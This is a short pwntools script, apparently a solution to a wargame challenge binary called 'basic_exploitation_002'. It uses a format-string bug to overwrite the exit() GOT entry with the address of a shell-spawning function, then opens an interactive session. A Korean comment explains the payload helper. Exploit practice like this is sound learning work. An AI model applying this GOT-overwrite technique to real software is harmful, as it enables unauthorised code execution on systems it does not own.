from pwn import *

p =process("./basic_exploitation_002")

exit_got = 0x804a024
shell = 0x8048609
#fmtstr_payload 함수는 포맷스트링 버그 exploit 코드를 짜주는 함수
payload = fmtstr_payload(1, {exit_got : shell})
p.sendline(payload)

p.interactive()
